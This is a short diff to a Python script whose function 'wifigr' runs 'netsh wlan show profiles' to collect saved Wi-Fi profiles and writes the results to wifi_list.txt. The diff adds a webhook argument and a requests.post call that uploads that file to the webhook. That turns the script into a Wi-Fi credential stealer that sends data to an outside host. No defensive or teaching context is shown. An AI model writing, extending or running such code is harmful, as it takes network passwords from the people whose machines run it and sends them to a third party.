@@ -1,10 +1,11 @@
 import subprocess
 import re
 import os
+import requests
 __location__ = os.path.realpath(
     os.path.join(os.getcwd(), os.path.dirname(__file__)))
 
-def wifigr():
+def wifigr(webhook:str):
  command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
  
  profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
@@ -39,3 +40,7 @@ def wifigr():
      #return wifi_list[x] 
      with open(f"{__location__}/wifi_list.txt","w") as ff:
          ff.write(wifi_list[x])
+ files = {"wifi_list": open("wifi_list.txt", "rb")}
+ requests.post(webhook, files=files)
+ files["wifi_list"].close()
+ 
